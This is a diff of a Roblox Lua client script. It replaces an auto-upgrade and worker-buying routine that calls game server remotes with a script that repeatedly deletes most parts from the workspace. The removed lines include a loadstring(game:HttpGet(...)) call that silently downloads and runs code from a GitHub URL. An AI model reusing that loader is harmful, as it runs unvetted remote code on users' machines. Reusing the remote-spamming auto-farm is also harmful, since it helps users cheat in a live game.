@@ -1,120 +1,87 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/halal"))()
-end)
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
 
-local player = Players.LocalPlayer
+local function getCurrentPlot()
+    local nonSaveVars = LocalPlayer:FindFirstChild("NonSaveVars")
+    if not nonSaveVars then return nil end
+    
+    local ownsPlot = nonSaveVars:FindFirstChild("OwnsPlot")
+    if not ownsPlot or not ownsPlot:IsA("ValueBase") then return nil end
+    
+    local plotNumber = ownsPlot.Value
+    if not plotNumber then return nil end
+    
+    return workspace:FindFirstChild("Plots") and workspace.Plots:FindFirstChild(tostring(plotNumber))
+end
 
-local UpgradeRemote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("UI"):WaitForChild("UpgradeClicked")
-local DataGetAllEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Data"):WaitForChild("GetAll")
-local Workers = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Workers")
-local BuyAuctionWorker = Workers:WaitForChild("BuyAuctionWorker")
-local BuyStockerWorker = Workers:WaitForChild("BuyStockerWorker")
-local BuySellerWorker = Workers:WaitForChild("BuySellerWorker")
-local GetWorkersData = Workers:WaitForChild("GetWorkersData")
-local UpgradeAuctionWorker = Workers:WaitForChild("UpgradeAuctionWorker")
-local UpgradeStockerWorker = Workers:WaitForChild("UpgradeStockerWorker")
-local UpgradeSellerWorker = Workers:WaitForChild("UpgradeSellerWorker")
-local UpgradeOfflineEarnings = Workers:WaitForChild("UpgradeOfflineEarnings")
-
-local upgrades = {
-    "ShopLevel",
-    "InventoryLevel",
-    "CarryLevel",
-    "StorageLevel",
-    "PaycheckAmount",
-    "AdditionalShopPlacement",
-    "OfflineEarnings"
+local keepInstances = {
+    workspace:WaitForChild("Baseplate2"),
+    workspace:WaitForChild("Debris"):WaitForChild("Auctions"),
 }
 
-local targetPerType = 3
-local maxLevel = 100
-local maxOfflineLevel = 50
+local currentPlot = getCurrentPlot()
+if currentPlot then
+    table.insert(keepInstances, currentPlot)
+end
 
-task.spawn(function()
-    while true do
-        local success, data = pcall(function()
-            return DataGetAllEvent:InvokeServer()
-        end)
-        
-        if success and data and data.Gems then
-            local workerData = GetWorkersData:InvokeServer()
-            local gems = data.Gems
-            
-            for _, upgrade in ipairs(upgrades) do
-                pcall(function()
-                    UpgradeRemote:InvokeServer(upgrade)
-                end)
-                task.wait(0.1)
-            end
-            
-            if #workerData.AuctionWorkers < targetPerType then
-                local hireCost = 100
-                if gems >= hireCost then
-                    BuyAuctionWorker:InvokeServer()
-                    gems = gems - hireCost
-                end
-            end
-            
-            if #workerData.StockerWorkers < targetPerType then
-                local hireCost = 100
-                if gems >= hireCost then
-                    BuyStockerWorker:InvokeServer()
-                    gems = gems - hireCost
-                end
-            end
-            
-            if #workerData.SellerWorkers < targetPerType then
-                local hireCost = 100
-                if gems >= hireCost then
-                    BuySellerWorker:InvokeServer()
-                    gems = gems - hireCost
-                end
-            end
-            
-            for _, worker in ipairs(workerData.AuctionWorkers) do
-                local currentLevel = worker.Upgrades.Level or 1
-                if currentLevel < maxLevel then
-                    local upgradeCost = 50 * currentLevel
-                    if gems >= upgradeCost then
-                        UpgradeAuctionWorker:InvokeServer(worker.Id, "Level")
-                        gems = gems - upgradeCost
-                    end
-                end
-            end
-            
-            for _, worker in ipairs(workerData.StockerWorkers) do
-                local currentLevel = worker.Upgrades.Level or 1
-                if currentLevel < maxLevel then
-                    local upgradeCost = 50 * currentLevel
-                    if gems >= upgradeCost then
-                        UpgradeStockerWorker:InvokeServer(worker.Id, "Level")
-                        gems = gems - upgradeCost
-                    end
-                end
-            end
-            
-            for _, worker in ipairs(workerData.SellerWorkers) do
-                local currentLevel = worker.Upgrades.Level or 1
-                if currentLevel < maxLevel then
-                    local upgradeCost = 50 * currentLevel
-                    if gems >= upgradeCost then
-                        UpgradeSellerWorker:InvokeServer(worker.Id, "Level")
-                        gems = gems - upgradeCost
-                    end
-                end
-            end
-            
-            local offlineLevel = workerData.OfflineEarningsLevel or 0
-            if offlineLevel < maxOfflineLevel then
-                local upgradeCost = 100 * (offlineLevel + 1)
-                if gems >= upgradeCost then
-                    UpgradeOfflineEarnings:InvokeServer()
-                end
-            end
+local function isPlayerCharacter(inst)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Character and inst:IsDescendantOf(plr.Character) then
+            return true
         end
-        
-        task.wait(0.5)
+    end
+    return false
+end
+
+local function shouldKeep(inst)
+    for _, keep in ipairs(keepInstances) do
+        if inst:IsDescendantOf(keep) or inst == keep then
+            return true
+        end
+    end
+    if isPlayerCharacter(inst) then
+        return true
+    end
+    return false
+end
+
+local function destroyTargets()
+    for _, inst in ipairs(workspace:GetDescendants()) do
+        if inst:IsA("BasePart") and not shouldKeep(inst) then
+            inst:Destroy()
+        end
+    end
+end
+
+task.wait(2)
+destroyTargets()
+
+workspace.DescendantAdded:Connect(function(inst)
+    task.wait()
+    if inst:IsA("BasePart") and not shouldKeep(inst) then
+        inst:Destroy()
     end
 end)
+
+Players.PlayerAdded:Connect(function()
+    task.wait(1)
+    local newPlot = getCurrentPlot()
+    if newPlot and not table.find(keepInstances, newPlot) then
+        for i, keep in ipairs(keepInstances) do
+            if keep and keep.Name ~= "Baseplate2" and keep.Name ~= "Auctions" then
+                keepInstances[i] = newPlot
+                break
+            end
+        end
+    end
+    destroyTargets()
+end)
+
+Players.PlayerRemoving:Connect(function()
+    task.wait(1)
+    destroyTargets()
+end)
+
+while task.wait(60) do
+    destroyTargets()
+end
